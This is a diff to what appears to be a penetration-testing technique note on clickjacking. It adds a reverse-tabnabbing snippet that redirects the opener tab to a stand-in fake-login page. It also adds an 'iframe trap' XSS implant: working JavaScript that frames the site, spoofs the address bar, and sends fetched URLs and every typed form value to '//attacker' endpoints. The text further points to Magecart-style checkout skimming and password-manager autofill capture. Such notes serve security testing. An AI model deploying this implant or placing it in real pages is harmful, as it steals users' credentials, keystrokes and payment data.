@@ -4,8 +4,8 @@ type: technique
 tags: [clickjacking, client-side, exploitation, web]
 phase: exploitation
 date_created: 2026-05-13
-date_updated: 2026-06-17
-sources: [payloadsallthethings-clickjacking, payloadsallthethings-tabnabbing, git-portswigger-all-labs, yibelo-doubleclickjacking]
+date_updated: 2026-07-15
+sources: [payloadsallthethings-clickjacking, payloadsallthethings-tabnabbing, git-portswigger-all-labs, yibelo-doubleclickjacking, hacktricks-web]
 ---
 
 ## What it is
@@ -208,6 +208,39 @@ Automated PoC generation:
 Reverse tabnabbing occurs when a page linked from the target page (e.g., `target="_blank"`) can rewrite the original page's location (using `window.opener.location = "http://evil.com"`) to a phishing site. If the user authenticates on the fake page thinking it's the original, their credentials are stolen.
 
 **Prevention:** Ensure external links use `rel="noopener"` or `rel="noreferrer"`.
+
+When the attacker controls the `href` of an `<a target="_blank">` that lacks `rel="noopener"` (or has `rel="opener"`), the opened page keeps a `window.opener` reference and can navigate the ORIGINAL tab cross-origin:
+
+```javascript
+// runs on the attacker page the victim opened in a new tab
+window.opener.location = "https://attacker/fake-login.html";
+```
+
+The victim finishes on the attacker page, returns to the original tab, and finds a pixel-perfect fake login (phishing without touching the original site). Cross-origin, `window.opener` exposes only `closed/frames/length/opener/parent/self/top`; same-origin it exposes the full window object (full takeover of the opener). Hunt for `target="_blank"` without `rel="noopener"` in user-controlled link sinks (comments, profile URLs, markdown renderers).
+
+## Iframe traps (same-origin XSS persistence)
+
+Turns a one-shot same-origin XSS into a session-long implant: the payload wraps the whole app in a full-viewport iframe and keeps the attacker-controlled top window alive while the victim keeps browsing INSIDE the frame. `history.replaceState()` mirrors the framed path into the address bar so navigation looks normal. From the top window you observe navigation, form submits, typed creds, fetch/XHR, and same-origin storage across every framed route.
+
+```html
+<script>
+if (window.top === window.self) {
+  const f = document.createElement('iframe');
+  f.src = '/';
+  f.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:2147483647;background:#fff';
+  document.body.appendChild(f);
+  f.addEventListener('load', () => {
+    const w = f.contentWindow, d = w.document;
+    const sync = u => { const x = new URL(u, location.origin); history.replaceState({}, '', x.pathname + x.search + x.hash); };
+    ['click','submit','popstate','hashchange'].forEach(e => w.addEventListener(e, () => sync(w.location.href), true));
+    const of = w.fetch; w.fetch = (...a) => { fetch('//attacker/log', {method:'POST', body:'u='+encodeURIComponent(a[0])}); return of.apply(w, a); };
+    d.addEventListener('input', e => { if (e.target.name) fetch('//attacker/keys', {method:'POST', body:new URLSearchParams({p:w.location.href, n:e.target.name, v:e.target.value})}); }, true);
+  });
+}
+</script>
+```
+
+Notes: `X-Frame-Options: SAMEORIGIN` / `frame-ancestors 'self'` do NOT stop same-origin self-framing (only `DENY`/`'none'` on sensitive routes does). For SPAs, hook `fetch`/`XHR`/`pushState`/`replaceState`, not just `load`/`click`. If CSP blocks inline JS, host the implant in a same-origin external script or child route. Also enables Magecart-style checkout overlays (hide the real hosted-payment iframe, overlay a skimmer) and password-manager autofill capture. Escape is still possible (tab close, manual URL edit, browser chrome), so it is persistence within a session, not containment.
 
 ## Tools
 - `clickjack` (machine1337)
